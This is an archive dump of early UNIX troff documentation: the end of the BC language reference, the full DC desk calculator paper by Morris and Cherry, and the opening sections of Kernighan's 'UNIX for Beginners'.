The result is the value of the named expression after
incrementing.
.NH 3
\-\-\|\fInamed-expression\fP
.PP
The named expression is
decremented by one.
The result is the value of the named expression after
decrementing.
.NH 3
\fInamed-expression\fP\|++
.PP
The named expression is
incremented by one.
The result is the value of the named expression before
incrementing.
.NH 3
\fInamed-expression\fP\|\-\-
.PP
The named expression is
decremented by one.
The result is the value of the named expression before
decrementing.
.NH 2
Exponentiation operator
.PP
The exponentiation operator binds right to left.
.NH 3
\fIexpression\fP ^ \fIexpression\fP
.PP
The result is the first
expression raised to the power of the
second expression.
The second expression must be an integer.
If \fIa\fP
is the scale of the left expression
and \fIb\fP is the absolute value
of the right expression,
then the scale of the result is:
.PP
min\|(\|\fIa\(mub\fP,\|max\|(\|\fBscale\fP,\|\fIa\fP\|)\|)
.NH 2
Multiplicative operators
.PP
The operators *, /, % bind left to right.
.NH 3
\fIexpression\fP * \fIexpression\fP
.PP
The result is the product
of the two expressions.
If \fIa\fP and \fIb\fP are the
scales of the two expressions,
then the scale of the result is:
.PP
min\|(\|\fIa+b\fP,\|max\|(\|\fBscale\fP,\|\fIa\fP,\|\fIb\fP\|)\|)
.NH 3
\fIexpression\fP / \fIexpression\fP
.PP
The result is the quotient of the two expressions.
The scale of the result is the value of \fBscale\fR.
.NH 3
\fIexpression\fP % \fIexpression\fP
.PP
The % operator produces the remainder of the division
of the two expressions.
More precisely,
\fIa\fP%\fIb\fP is \fIa\fP\-\fIa\fP/\fIb\fP*\fIb\fP.
.PP
The scale of the result is the sum of the scale of
the divisor and the value of
.ft B
scale
.ft
.NH 2
Additive operators
.PP
The additive operators bind left to right.
.NH 3
\fIexpression\fP + \fIexpression\fP
.PP
The result is the sum of the two expressions.
The scale of the result is
the maximun of the scales of the expressions.
.NH 3
\fIexpression\fP \- \fIexpression\fP
.PP
The result is the difference of the two expressions.
The scale of the result is the
maximum of the scales of the expressions.
.NH 2
assignment operators
.PP
The assignment operators bind right to left.
.NH 3
\fInamed-expression\fP = \fIexpression\fP
.PP
This expression results in assigning the value of the expression
on the right
to the named expression on the left.
.NH 3
\fInamed-expression\fP =+ \fIexpression\fP
.NH 3
\fInamed-expression\fP =\- \fIexpression\fP
.NH 3
\fInamed-expression\fP =* \fIexpression\fP
.NH 3
\fInamed-expression\fP =/ \fIexpression\fP
.NH 3
\fInamed-expression\fP =% \fIexpression\fP
.NH 3
\fInamed-expression\fP =^ \fIexpression\fP
.PP
The result of the above expressions is equivalent
to ``named expression = named expression OP expression'',
where OP is the operator after the = sign.
.NH 1
Relations
.PP
Unlike all other operators, the relational operators
are only valid as the object of an \fBif\fP, \fBwhile\fP,
or inside a \fBfor\fP statement.
.NH 2
\fIexpression\fP < \fIexpression\fP
.NH 2
\fIexpression\fP > \fIexpression\fP
.NH 2
\fIexpression\fP <= \fIexpression\fP
.NH 2
\fIexpression\fP >= \fIexpression\fP
.NH 2
\fIexpression\fP == \fIexpression\fP
.NH 2
\fIexpression\fP != \fIexpression\fP
.NH 1
Storage classes
.PP
There are only two storage classes in BC, global and automatic
(local).
Only identifiers that are to be local to a function need be 
declared with the \fBauto\fP command.
The arguments to a function
are local to the function.
All other identifiers are assumed to be global
and available to all functions.
All identifiers, global and local, have initial values
of zero.
Identifiers declared as \fBauto\fP are allocated on entry to the function 
and released on returning from the function.
They therefore do not retain values between function calls.
\fBauto\fP arrays are specified by the array name followed by empty square brackets.
.PP
Automatic variables in BC do not work in exactly the same way
as in either C or PL/I.  On entry to a function, the old values of
the names that appear as parameters and as automatic
variables are pushed onto a stack.  
Until return is made from the function, reference to these
names refers only to the new values.
.NH 1
Statements
.PP
Statements must be separated by semicolon or newline.
Except where altered by control statements, execution
is sequential.
.NH 2
Expression statements
.PP
When a statement is an expression, unless
the main operator is an assignment, the value
of the expression is printed, followed by a newline character.
.NH 2
Compound statements
.PP
Statements may be grouped together and used when one statement is expected
by surrounding them with { }.
.NH 2
Quoted string statements
.PP
"any string"
.sp .5
This statement prints the string inside the quotes.
.NH 2
If statements
.sp .5
\fBif\|(\|\fIrelation\fB\|)\|\fIstatement\fR
.PP
The substatement is executed if the relation is true.
.NH 2
While statements
.sp .5
\fBwhile\|(\|\fIrelation\fB\|)\|\fIstatement\fR
.PP
The statement is executed while the relation
is true.
The test occurs before each execution of the statement.
.NH 2
For statements
.sp .5
\fBfor\|(\|\fIexpression\fB; \fIrelation\fB; \fIexpression\fB\|)\|\fIstatement\fR
.PP
The for statement is the same as
.nf
.ft I
	first-expression
	\fBwhile\|(\fPrelation\|\fB) {\fP
		statement
		last-expression
	}
.ft R
.fi
.PP
All three expressions must be present.
.NH 2
Break statements
.sp .5
\fBbreak\fP
.PP
\fBbreak\fP causes termination of a \fBfor\fP or \fBwhile\fP statement.
.NH 2
Auto statements
.sp .5
\fBauto \fIidentifier\fR\|[\|\fB,\fIidentifier\fR\|]
.PP
The auto statement causes the values of the identifiers to be pushed down.
The identifiers can be ordinary identifiers or array identifiers.
Array identifiers are specified by following the array name by empty square
brackets.
The auto statement must be the first statement
in a function definition.
.NH 2
Define statements
.sp .5
.nf
\fBdefine(\|\fR[\fIparameter\|\fR[\fB\|,\|\fIparameter\|.\|.\|.\|\fR]\|]\|\fB)\|{\fI
	statements\|\fB}\fR
.fi
.PP
The define statement defines a function.
The parameters may
be ordinary identifiers or array names.
Array names must be followed by empty square brackets.
.NH 2
Return statements
.sp .5
\fBreturn\fP
.sp .5
\fBreturn(\fI\|expression\|\fB)\fR
.PP
The return statement causes termination of a function,
popping of its auto variables, and
specifies the result of the function.
The first form is equivalent to \fBreturn(0)\fR.
The result of the function is the result of the expression
in parentheses.
.NH 2
Quit
.PP
The quit statement stops execution of a BC program and returns
control to UNIX when it is first encountered.
Because it is not treated as an executable statement,
it cannot be used
in a function definition or in an 
.ft B
if, for,
.ft
or
.ft B
while
.ft
statement.
-- /usr/doc/bc/dc mode=0110664 uid=3 gid=3 atime=173059380 mtime=173059614 --
.RP 75-1271-8 39199 39199-11
.TL
DC \- An Interactive Desk Calculator
.AU "MH 2C-524" 3878
Robert Morris
.AU
Lorinda Cherry
.AI
.MH
.AB
DC is an interactive desk calculator program implemented
on the UNIX time-sharing system to do arbitrary-precision
integer arithmetic.
It has provision for manipulating scaled fixed-point numbers and
for input and output in bases other than decimal.
.PP
The size of numbers that can be manipulated is limited
only by available core storage.
On typical implementations of UNIX, the size of numbers that
can be handled varies from several hundred digits on the smallest
systems to several thousand on the largest.
.AE
.PP
.SH
.ND
.PP
DC is an arbitrary precision arithmetic package implemented
on the UNIX time-sharing system
in the form of an interactive desk calculator.
It works like a stacking calculator using reverse Polish notation.
Ordinarily DC operates on decimal integers, but one may
specify an input base, output base, and a number of fractional
digits to be maintained.
.PP
A language called BC [1] has been developed which accepts
programs written in the familiar style of higher-level
programming languages and compiles output which is
interpreted by DC.
Some of the commands described below were designed
for the compiler interface and are not easy for a human user
to manipulate.
.PP
Numbers that are typed into DC are put on a push-down
stack.
DC commands work by taking the top number or two
off the stack, performing the desired operation, and pushing the result
on the stack.
If an argument is given,
input is taken from that file until its end,
then from the standard input.
.SH
SYNOPTIC DESCRIPTION
.PP
Here we describe the DC commands that are intended
for use by people.  The additional commands that are
intended to be invoked by compiled output are
described in the detailed description.
.PP
Any number of commands are permitted on a line.
Blanks and new-line characters are ignored except within numbers
and in places where a register name is expected.
.PP
The following constructions are recognized:
.SH
number
.IP
The value of the number is pushed onto the main stack.
A number is an unbroken string of the digits 0-9
and the capital letters A\-F which are treated as digits
with values 10\-15 respectively.
The number may be preceded by an underscore \*_ to input a
negative number.
Numbers may contain decimal points.
.SH
+  \-  *  %  ^
.IP
The
top two values on the stack are added
(\fB+\fP),
subtracted
(\fB\-\fP),
multiplied (\fB*\fP),
divided (\fB/\fP),
remaindered (\fB%\fP),
or exponentiated (^).
The two entries are popped off the stack;
the result is pushed on the stack in their place.
The result of a division is an integer truncated toward zero.
See the detailed description below for the treatment of
numbers with decimal points.
An exponent must not have any digits after the decimal point.
.SH
s\fIx\fP
.IP
The
top of the main stack is popped and stored into
a register named \fIx\fP, where \fIx\fP may be any character.
If
the
.ft B
s
.ft
is capitalized,
.ft I
x
.ft
is treated as a stack and the value is pushed onto it.
Any character, even blank or new-line, is a valid register name.
.SH
l\fIx\fP
.IP
The
value in register
.ft I
x
.ft
is pushed onto the stack.
The register
.ft I
x
.ft
is not altered.
If the
.ft B
l
.ft
is capitalized,
register
.ft I
x
.ft
is treated as a stack and its top value is popped onto the main stack.
.LP
All registers start with empty value which is treated as a zero
by the command \fBl\fP and is treated as an error by the command \fBL\fP.
.SH
.SH
d
.IP
The
top value on the stack is duplicated.
.SH
p
.IP
The top value on the stack is printed.
The top value remains unchanged.
.SH
f
.IP
All values on the stack and in registers are printed.
.SH
x
.IP
treats the top element of the stack as a character string,
removes it from the stack, and
executes it as a string of DC commands.
.SH
[ ... ]
.IP
puts the bracketed character string onto the top of the stack.
.SH
q
.IP
exits the program.
If executing a string, the recursion level is
popped by two.
If
.ft B
q
.ft
is capitalized,
the top value on the stack is popped and the string execution level is popped
by that value.
.SH
<\fIx\fP  >\fIx\fP  =\fIx\fP  !<\fIx\fP  !>\fIx\fP  !=\fIx\fP
.IP
The
top two elements of the stack are popped and compared.
Register
.ft I
x
.ft
is executed if they obey the stated
relation.
Exclamation point is negation.
.SH
v
.IP
replaces the top element on the stack by its square root.
The square root of an integer is truncated to an integer.
For the treatment of numbers with decimal points, see
the detailed description below.
.SH
!
.IP
interprets the rest of the line as a UNIX command.
Control returns to DC when the UNIX command terminates.
.SH
c
.IP
All values on the stack are popped; the stack becomes empty.
.SH
i
.IP
The top value on the stack is popped and used as the
number radix for further input.
If \fBi\fP is capitalized, the value of
the input base is pushed onto the stack.
No mechanism has been provided for the input of arbitrary
numbers in bases less than 1 or greater than 16.
.SH
o
.IP
The top value on the stack is popped and used as the
number radix for further output.
If \fBo\fP is capitalized, the value of the output
base is pushed onto the stack.
.SH
k
.IP
The top of the stack is popped, and that value is used as
a scale factor
that influences the number of decimal places
that are maintained during multiplication, division, and exponentiation.
The scale factor must be greater than or equal to zero and
less than 100.
If \fBk\fP is capitalized, the value of the scale factor
is pushed onto the stack.
.SH
z
.IP
The value of the stack level is pushed onto the stack.
.SH
?
.IP
A line of input is taken from the input source (usually the console)
and executed.
.SH
DETAILED DESCRIPTION
.SH
Internal Representation of Numbers
.PP
Numbers are stored internally using a dynamic storage allocator.
Numbers are kept in the form of a string
of digits to the base 100 stored one digit per byte
(centennial digits).
The string is stored with the low-order digit at the
beginning of the string.
For example, the representation of 157
is 57,1.
After any arithmetic operation on a number, care is taken
that all digits are in the range 0\-99 and that
the number has no leading zeros.
The number zero is represented by the empty string.
.PP
Negative numbers are represented in the 100's complement
notation, which is analogous to two's complement notation for binary
numbers.
The high order digit of a negative number is always \-1
and all other digits are in the range 0\-99.
The digit preceding the high order \-1 digit is never a 99.
The representation of \-157 is 43,98,\-1.
We shall call this the canonical form of a number.
The advantage of this kind of representation of negative
numbers is ease of addition.  When addition is performed digit
by digit, the result is formally correct.  The result need only
be modified, if necessary, to put it into canonical form.
.PP
Because the largest valid digit is 99 and the byte can
hold numbers twice that large, addition can be carried out
and the handling of carries done later when
that is convenient, as it sometimes is.
.PP
An additional byte is stored with each number beyond
the high order digit to indicate the number of
assumed decimal digits after the decimal point.  The representation
of .001 is 1,\fI3\fP
where the scale has been italicized to emphasize the fact that it
is not the high order digit.
The value of this extra byte is called the
.ft B
scale factor
.ft
of the number.
.SH
The Allocator
.PP
DC uses a dynamic string storage allocator
for all of its internal storage.
All reading and writing of numbers internally is done through
the allocator.
Associated with each string in the allocator is a four-word header containing pointers
to the beginning of the string, the end of the string,
the next place to write, and the next place to read.
Communication between the allocator and DC
is done via pointers to these headers.
.PP
The allocator initially has one large string on a list
of free strings.  All headers except the one pointing
to this string are on a list of free headers.
Requests for strings are made by size.
The size of the string actually supplied is the next higher
power of 2.
When a request for a string is made, the allocator
first checks the free list to see if there is
a string of the desired size.
If none is found, the allocator finds the next larger free string and splits it repeatedly until
it has a string of the right size.
Left-over strings are put on the free list.
If there are no larger strings,
the allocator tries to coalesce smaller free strings into
larger ones.
Since all strings are the result
of splitting large strings,
each string has a neighbor that is next to it in core
and, if free, can be combined with it to make a string twice as long.
This is an implementation of the `buddy system' of allocation
described in [2].
.PP
Failing to find a string of the proper length after coalescing,
the allocator asks the system for more space.
The amount of space on the system is the only limitation
on the size and number of strings in DC.
If at any time in the process of trying to allocate a string, the allocator runs out of
headers, it also asks the system for more space.
.PP
There are routines in the allocator for reading, writing, copying, rewinding,
forward-spacing, and backspacing strings.
All string manipulation is done using these routines.
.PP
The reading and writing routines
increment the read pointer or write pointer so that
the characters of a string are read or written in
succession by a series of read or write calls.
The write pointer is interpreted as the end of the
information-containing portion of a string and a call
to read beyond that point returns an end-of-string indication.
An attempt to write beyond the end of a string
causes the allocator to
allocate a larger space and then copy
the old string into the larger block.
.SH
Internal Arithmetic
.PP
All arithmetic operations are done on integers.
The operands (or operand) needed for the operation are popped
from the main stack and their scale factors stripped off.
Zeros are added or digits removed as necessary to get
a properly scaled result from the internal arithmetic routine.
For example, if the scale of the operands is different and decimal
alignment is required, as it is for
addition, zeros are appended to the operand with the smaller
scale.
After performing the required arithmetic operation,
the proper scale factor is appended to the end of the number before
it is pushed on the stack.
.PP
A register called \fBscale\fP plays a part
in the results of most arithmetic operations.
\fBscale\fP is the bound on the number of decimal places retained in
arithmetic computations.
\fBscale\fP may be set to the number on the top of the stack
truncated to an integer with the \fBk\fP command.
\fBK\fP may be used to push the value of \fBscale\fP on the stack.
\fBscale\fP must be greater than or equal to 0 and less than 100.
The descriptions of the individual arithmetic operations will
include the exact effect of \fBscale\fP on the computations.
.SH
Addition and Subtraction
.PP
The scales of the two numbers are compared and trailing
zeros are supplied to the number with the lower scale to give both
numbers the same scale.  The number with the smaller scale is
multiplied by 10 if the difference of the scales is odd.
The scale of the result is then set to the larger of the scales
of the two operands.
.PP
Subtraction is performed by negating the number
to be subtracted and proceeding as in addition.
.PP
Finally, the addition is performed digit by digit from the
low order end of the number.  The carries are propagated
in the usual way.
The resulting number is brought into canonical form, which may
require stripping of leading zeros, or for negative numbers
replacing the high-order configuration 99,\-1 by the digit \-1.
In any case, digits which are not in the range 0\-99 must
be brought into that range, propagating any carries or borrows
that result.
.SH
Multiplication
.PP
The scales are removed from the two operands and saved.
The operands are both made positive.
Then multiplication is performed in
a digit by digit manner that exactly mimics the hand method
of multiplying.
The first number is multiplied by each digit of the second
number, beginning with its low order digit.  The intermediate
products are accumulated into a partial sum which becomes the
final product.
The product is put into the canonical form and its sign is
computed from the signs of the original operands.
.PP
The scale of the result is set equal to the sum
of the scales of the two operands.
If that scale is larger than the internal register
.ft B
scale
.ft
and also larger than both of the scales of the two operands,
then the scale of the result is set equal to the largest
of these three last quantities.
.SH
Division
.PP
The scales are removed from the two operands.
Zeros are appended or digits removed from the dividend to make
the scale of the result of the integer division equal to
the internal quantity
\fBscale\fP.
The signs are removed and saved.
.PP
Division is performed much as it would be done by hand.
The difference of the lengths of the two numbers
is computed.
If the divisor is longer than the dividend,
zero is returned.
Otherwise the top digit of the divisor is divided into the top
two digits of the dividend.
The result is used as the first (high-order) digit of the
quotient.
It may turn out be one unit too low, but if it is, the next
trial quotient will be larger than 99 and this will be
adjusted at the end of the process.
The trial digit is multiplied by the divisor and the result subtracted
from the dividend and the process is repeated to get
additional quotient digits until the remaining
dividend is smaller than the divisor.
At the end, the digits of the quotient are put into
the canonical form, with propagation of carry as needed.
The sign is set from the sign of the operands.
.SH
Remainder
.PP
The division routine is called and division is performed
exactly as described.  The quantity returned is the remains of the
dividend at the end of the divide process.
Since division truncates toward zero, remainders have the same
sign as the dividend.
The scale of the remainder is set to 
the maximum of the scale of the dividend and
the scale of the quotient plus the scale of the divisor.
.SH
Square Root
.PP
The scale is stripped from the operand.
Zeros are added if necessary to make the
integer result have a scale that is the larger of
the internal quantity
\fBscale\fP
and the scale of the operand.
.PP
The method used to compute sqrt(y) is Newton's method
with successive approximations by the rule
.EQ
x sub {n+1} = \(12 ( x sub n + y over x sub n )
.EN
The initial guess is found by taking the integer square root
of the top two digits.
.SH
Exponentiation
.PP
Only exponents with zero scale factor are handled.  If the exponent is
zero, then the result is 1.  If the exponent is negative, then
it is made positive and the base is divided into one.  The scale
of the base is removed.
.PP
The integer exponent is viewed as a binary number.
The base is repeatedly squared and the result is
obtained as a product of those powers of the base that
correspond to the positions of the one-bits in the binary
representation of the exponent.
Enough digits of the result
removed to make the scale of the result the same as if the
indicated multiplication had been performed.
.SH
Input Conversion and Base
.PP
Numbers are converted to the internal representation as they are read
in.
The scale stored with a number is simply the number of fractional digits input.
Negative numbers are indicated by preceding the number with a \fB\_\fP.
The hexadecimal digits A\-F correspond to the numbers 10\-15 regardless of input base.
The \fBi\fP command can be used to change the base of the input numbers.
This command pops the stack, truncates the resulting number to an integer,
and uses it as the input base for all further input.
The input base is initialized to 10 but may, for example be changed to
8 or 16 to do octal or hexadecimal to decimal conversions.
The command \fBI\fP will push the value of the input base on the stack.
.SH
Output Commands
.PP
The command \fBp\fP causes the top of the stack to be printed.
It does not remove the top of the stack.
All of the stack and internal registers can be output
by typing the command \fBf\fP.
The \fBo\fP command can be used to change the output base.
This command uses the top of the stack, truncated to an integer as
the base for all further output.
The output base in initialized to 10.
It will work correctly for any base.
The command \fBO\fP pushes the value of the output base on the stack.
.SH
Output Format and Base
.PP
The input and output bases only affect
the interpretation of numbers on input and output; they have no
effect on arithmetic computations.
Large numbers are output with 70 characters per line;
a \\ indicates a continued line.
All choices of input and output bases work correctly, although not all are
useful.
A particularly useful output base is 100000, which has the effect of
grouping digits in fives.
Bases of 8 and 16 can be used for decimal-octal or decimal-hexadecimal
conversions.
.SH
Internal Registers
.PP
Numbers or strings may be stored in internal registers or loaded on the stack
from registers with the commands \fBs\fP and \fBl\fP.
The command \fBs\fIx\fR pops the top of the stack and
stores the result in register \fBx\fP.
\fIx\fP can be any character.
\fBl\fIx\fR puts the contents of register \fBx\fP on the top of the stack.
The \fBl\fP command has no effect on the contents of register \fIx\fP.
The \fBs\fP command, however, is destructive.
.SH
Stack Commands
.PP
The command \fBc\fP clears the stack.
The command \fBd\fP pushes a duplicate of the number on the top of the stack
on the stack.
The command \fBz\fP pushes the stack size on the stack.
The command \fBX\fP replaces the number on the top of the stack
with its scale factor.
The command \fBZ\fP replaces the top of the stack
with its length.
.SH
Subroutine Definitions and Calls
.PP
Enclosing a string in \fB[]\fP pushes the ascii string on the stack.
The \fBq\fP command quits or in executing a string, pops the recursion levels by two.
.SH
Internal Registers \- Programming DC
.PP
The load and store
commands together with \fB[]\fP to store strings, \fBx\fP to execute
and the testing commands `<', `>', `=', `!<', `!>', `!=' can be used to program
DC.
The \fBx\fP command assumes the top of the stack is an string of DC commands
and executes it.
The testing commands compare the top two elements on the stack and if the relation holds, execute the register
that follows the relation.
For example, to print the numbers 0-9,
.DS
[lip1+  si  li10>a]sa
0si  lax
.DE
.SH
Push-Down Registers and Arrays
.PP
These commands were designed for used by a compiler, not by
people.
They involve push-down registers and arrays.
In addition to the stack that commands work on, DC can be thought
of as having individual stacks for each register.
These registers are operated on by the commands \fBS\fP and \fBL\fP.
\fBS\fIx\fR pushes the top value of the main stack onto the stack for
the register \fIx\fP.
\fBL\fIx\fR pops the stack for register \fIx\fP and puts the result on the main
stack.
The commands \fBs\fP and \fBl\fP also work on registers but not as push-down
stacks.
\fBl\fP doesn't effect the top of the
register stack, and \fBs\fP destroys what was there before.
.PP
The commands to work on arrays are \fB:\fP and \fB;\fP.
\fB:\fIx\fR pops the stack and uses this value as an index into
the array \fIx\fP.
The next element on the stack is stored at this index in \fIx\fP.
An index must be greater than or equal to 0 and
less than 2048.
\fB;\fIx\fR is the command to load the main stack from the array \fIx\fP.
The value on the top of the stack is the index
into the array \fIx\fP of the value to be loaded.
.SH
Miscellaneous Commands
.PP
The command \fB!\fP interprets the rest of the line as a UNIX command and passes
it to UNIX to execute.
One other compiler command is \fBQ\fP.
This command uses the top of the stack as the number of levels of recursion to skip.
.SH
DESIGN CHOICES
.PP
The real reason for the use of a dynamic storage allocator was
that a general purpose program could be (and in fact has been)
used for a variety of other tasks.
The allocator has some value for input and for compiling (i.e.
the bracket [...] commands) where it cannot be known in advance
how long a string will be.
The result was that at a modest
cost in execution time, all considerations of string allocation
and sizes of strings were removed from the remainder of the program
and debugging was made easier.  The allocation method
used wastes approximately 25% of available space.
.PP
The choice of 100 as a base for internal arithmetic
seemingly has no compelling advantage.  Yet the base cannot
exceed 127 because of hardware limitations and at the cost
of 5% in space, debugging was made a great deal easier and
decimal output was made much faster.
.PP
The reason for a stack-type arithmetic design was
to permit all DC commands from addition to subroutine execution
to be implemented in essentially the same way.  The result
was a considerable degree of logical separation of the final
program into modules with very little communication between
modules.
.PP
The rationale for the lack of interaction between the scale and the bases
was to provide an understandable means of proceeding after
a change of base or scale when numbers had already been entered.
An earlier implementation which had global notions of
scale and base did not work out well.
If the value of
.ft B
scale
.ft
were to be interpreted in the current
input or output base,
then a change of base or scale in the midst of a
computation would cause great confusion in the interpretation
of the results.
The current scheme has the advantage that the value of
the input and output bases
are only used for input and output, respectively, and they
are ignored in all other operations.
The value of
scale
is not used for any essential purpose by any part of the program
and it is used only to prevent the number of
decimal places resulting from the arithmetic operations from
growing beyond all bounds.
.PP
The design rationale for the choices for the scales of
the results of arithmetic were that in no case should
any significant digits be thrown away if, on appearances, the
user actually wanted them.  Thus, if the user wants
to add the numbers 1.5 and 3.517, it seemed reasonable to give
him the result 5.017 without requiring him to unnecessarily
specify his rather obvious requirements for precision.
.PP
On the the other hand, multiplication and exponentiation produce
results with many more digits than their operands and it
seemed reasonable to give as a minimum the number of decimal
places in the operands but not to give more than that
number of digits
unless the user asked for them by specifying a value for \fBscale\fP.
Square root can be handled in just the same way as multiplication.
The operation of division gives arbitrarily many decimal places
and there is simply no way to guess how many places the user
wants.
In this case only, the user must
specify a \fBscale\fP to get any decimal places at all.
.PP
The scale of remainder was chosen to make it possible
to recreate the dividend from the quotient and remainder.
This is easy to implement; no digits are thrown away.
.SH
References
.IP[1]
L. L. Cherry, R. Morris,
.ft I
BC \- An Arbitrary Precision Desk-Calculator Language,
.ft
.IP[2]
K. C. Knowlton,
.ft I
A Fast Storage Allocator,
.ft
Comm. ACM \fB8\fP, pp. 623-625 (Oct. 1965)
.LP
-- /usr/doc/beg mode=0140775 uid=3 gid=3 atime=173059621 mtime=173059507 --
-- /usr/doc/beg/abs mode=0100664 uid=3 gid=3 atime=170478200 mtime=173059621 --
.RP
.TL
UNIX For Beginners
.AU
.ps 10
Brian W. Kernighan
.AI
.ps 10
.MH
.AB
.PP
This paper is meant to help
new users get started on UNIX.
It covers:
.sp
\(bu basics needed for day-to-day use of the system _
typing commands, correcting typing mistakes, logging in and out,
mail, inter-console communication,
the file system, printing files,
redirecting I/O, pipes, and the shell.
.sp
\(bu document preparation _
a brief tutorial on the 
\s-2ROFF\s+2
formatter for beginners, hints on preparing documents,
and capsule descriptions of some supporting software.
.sp
\(bu \s-2UNIX\s+2 programming _
using the editor, programming the shell, programming in C,
other languages.
.PP
There is also an annotated UNIX bibliography.
.AE
-- /usr/doc/beg/u mode=0100664 uid=3 gid=3 atime=170478244 mtime=173059621 --
.de C
\fB\\$1\fP\\$2
..
.de UC
\s-2\\$1\s0\\$2
..
.de B1
.if t .sp 6p
.if n .ls 1
.if n .sp
.if n .in 10
.if t .in 3
.if \\$1 .if t .in 1
.nf
.tr ^.
.if t .tr -\(en
..
.de B2
.if n .sp
.if n .ls 2
.if t .sp 6p
.in 0
.tr --
.fi
..
.de SE
.if t .C \\$1\| \\$2
.if n \\$1\\$2
..
.if n .ls 2
.	SH - (unnumbered) section heading
.de SH
.RT
.if \\n(1T .sp 1
.if !\\n(1T .BG
.RT
.ne 3
.ft B
.if n .ul 1000
..
-- /usr/doc/beg/u0 mode=0100664 uid=3 gid=3 atime=170478200 mtime=173059622 --
.RP
.TL
UNIX for Beginners
.AU
Brian W. Kernighan
.AI
Bell Laboratories, Murray Hill, N. J.
.ND
.nr PS 9
.nr VS 11
.if n .ls 2
.RS
.sp 2
.if t .2C
.SH Introduction
.PP
In many ways,
.UC UNIX 
is
the state of the art
in computer operating systems.
From the user's point of view, it is easy
to learn and use,
and presents few of the usual impediments
to getting the job done.
.PP
It is hard, however, for the beginner
to know where to start,
and how to make the best use 
of the facilities available.
The purpose of this introduction
is to point out high spots for new users,
so they can get used to the main ideas of 
.UC UNIX
and start making good use of it quickly.
.PP
This paper is not an attempt to re-write
the
.ul 2
.UC UNIX
Programmer's Manual;
often the discussion of something
is simply
``read section x in the manual.''
(This implies that you will need a copy of the
.ul 2
.UC UNIX
Programmer's Manual.)
Rather it suggests in what order
to read the manual,
and it collects together
things that are stated only indirectly
in the manual.
.PP
There are five sections:
.IP "  1."
Getting Started:
How to log in to a
.UC UNIX,
how to type,
what to do about mistakes in typing,
how to log out.
Some of this is dependent on which
.UC UNIX
you log into
(phone numbers, for example)
and what terminal you use,
so this section must necessarily be supplemented
by local information.
.IP "  2."
Day-to-day Use:
Things you need every day to use
.UC UNIX
effectively:
generally useful commands;
the file system.
.IP "  3."
Document Preparation:
Preparing manuscripts is one of the most common uses
for
.UC UNIX.
This section contains advice,
but not
extensive instructions on any
of the formatting programs.
.IP "  4."
Writing Programs:
.UC UNIX
is an excellent vehicle for developing programs.
This section talks about some of the tools,
but again is not a tutorial in any of the programming languages
that
.UC UNIX
provides.
.IP "  5."
A
.UC UNIX
Reading List.
An annotated bibliography of 
documents worth reading by new users.
-- /usr/doc/beg/u1 mode=0110664 uid=3 gid=3 atime=170478201 mtime=173059622 --
.sp
.SH
I.  GETTING STARTED
.SH
Logging In
.PP
Most of the details about logging in are in the manual
section
called
``How to Get Started''
(pages
.ul
iv-v
in the 5th Edition).
Here are a couple of extra warnings.
.PP
You must have a 
.UC UNIX
login name, which you can get from
whoever administers your system.
You also need to know the phone number.
.UC UNIX
is capable of dealing with a variety of terminals:
Terminet 300's; Execuport, TI and similar
portables;
video terminals; GSI's; and even the venerable
Teletype in its various forms.
But note:
.UC UNIX
will not handle IBM 2741 terminals
and their derivatives
(e.g., some Anderson-Jacobsons, Novar).
Furthermore,
.UC UNIX
is strongly oriented towards devices with 
.ul
lower case.
If your terminal produces only upper case (e.g., model 33 Teletype),
life will be so difficult that you should look for another
terminal.
.PP
Be sure to set the switches appropriately on your device:
speed (if it's variable) to 30 characters per second,
lower case,
full duplex, even parity, and any others
that local wisdom advises.
Establish a connection using whatever
magic is needed for your terminal.
.UC UNIX
should type ``login:'' at you.
If it types garbage, you may be at the wrong speed;
push the `break' or `interrupt' key once.
If that fails to produce a login message, consult a guru.
.PP
When you get a ``login:'' message,
type your
login name
.ul
in lower case.
Follow it by a 
.UC RETURN
if the terminal has one.
If a password is required,
you will be asked for it,
and (if possible)
printing will be turned off while you type it,
again followed by a
.UC RETURN.
(On M37 Teletypes always use
.UC NEWLINE
or
.UC LINEFEED
in place of
.UC RETURN ).
.PP
The culmination of your login efforts is a percent sign ``%''.
The percent sign means that 
.UC UNIX
is ready to accept commands from the terminal.
(You may also get a message of the day just before the
percent sign or a notification that you have mail.)
.SH
Typing Commands
.PP
Once you've seen the percent sign, you can type commands,
which are
requests that
.UC UNIX
do something.
Try typing
.B1
date
.B2
followed by 
.UC RETURN.
You should get back something like
.B1
Sun Sep 22 10:52:29 EDT 1974
.B2
Don't forget the
.UC RETURN
after the command,
or nothing will happen.
If you think you're being ignored,
type a
.UC RETURN ;
something should happen.
We won't show the carriage returns,
but they have to be there.
.PP
Another command you might try is
.C who ,
which tells you everyone who is currently logged in:
.B1
who
.B2
gives something like
.B1
pjp	ttyf	Sep 22 09:40
bwk	ttyg	Sep 22 09:48
mel	ttyh	Sep 22 09:58
.B2
The time is when the user logged in.
.PP
If you make a mistake typing the command name,
.UC UNIX
will tell you.
For example, if you type
.B1
whom
.B2
you will be told 
.B1
whom: not found
.B2
.SH
Strange Terminal Behavior
.PP
Sometimes you can get into a state
where your terminal acts strangely.
For example,
each letter may be typed twice,
or the
.UC RETURN
may not cause a line feed.
You can often fix this by logging out and logging back in.
Or you can read the description of the command
.C stty
in section I of the manual.
This will also tell you how to get intelligent treatment of
tab characters
(which are much used in
.UC UNIX )
if your terminal doesn't have tabs.
If it does have computer-settable tabs,
the command
.C tabs
will set the stops correctly for you.
.SH
Mistakes in Typing
.PP
If you make a typing mistake, and see it before the carriage return
has been typed,
there are two ways to recover.
The sharp-character ``#'' erases the last character typed;
in fact successive uses of ``#'' erase characters back to
the beginning of the line (but not beyond).
So if you type badly, you can correct as you go:
.B1
dd#atte##e
.B2
is the same as ``date''.
.PP
The at-sign ``@'' erases all of the characters
typed so far
on the current input line,
so if the line is irretrievably fouled up, type an ``@'' and start over
(on the same line!).
.PP
What if you must enter a sharp or at-sign
as part of the text?
If you precede either ``#'' or ``@'' by a backslash ``\\'',
it loses its erase meaning.
This implies that to erase a backslash,
you have to type two sharps or two at-signs.
The backslash is used extensively in
.UC UNIX
to indicate that the following character is in some way special.
.SH
Readahead
.PP
.UC UNIX
has full readahead,
which means that you can type as fast as you want,
whenever you want,
even when some command is typing at you.
If you type during output,
your input characters will appear intermixed with the output characters,
but they will be stored away by
.UC UNIX
and interpreted in the correct order.
So you can type two commands one after another without
waiting for the first to finish or even begin.
.SH
Stopping a Program
.PP
You can stop most programs by
typing the character ``DEL''
(perhaps called ``delete'' or ``rubout'' on your terminal).
There are exceptions, like the text editor,
where
.UC DEL
stops whatever the program is doing but leaves you in that program.
You can also just hang up the phone.
